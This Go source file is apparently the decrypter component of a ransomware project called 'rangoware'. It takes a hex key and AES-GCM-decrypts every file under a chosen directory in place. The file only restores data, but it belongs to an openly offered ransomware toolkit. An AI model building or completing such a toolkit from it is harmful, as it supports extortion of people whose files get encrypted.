package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/LuanSilveiraSouza/rangoware/explorer"
)

func main() {
	dir := "" // Insert starting directory

	fmt.Print("Decrypter \nInsert decrypt key:")

	reader := bufio.NewReader(os.Stdin)

	text, _ := reader.ReadString('\n')

	text = strings.Replace(text, "\n", "", -1)

	key, err := hex.DecodeString(text)

	if err != nil {
		fmt.Println("Wrong key.")
	} else {

		files := explorer.MapFiles(dir)

		for _, v := range files {
			file, err := ioutil.ReadFile(v)

			if err != nil {
				continue
			}

			decrypted, err := Decrypt(file, key)

			if err != nil {
				continue
			}

			ioutil.WriteFile(v, decrypted, 0644)
		}

		fmt.Println("Files Decrypted.")
	}

	os.Exit(3)
}

func Decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)

	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)

	if err != nil {
		return nil, err
	}

	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)

	if err != nil {
		return nil, err
	}

	return plainText, nil
}
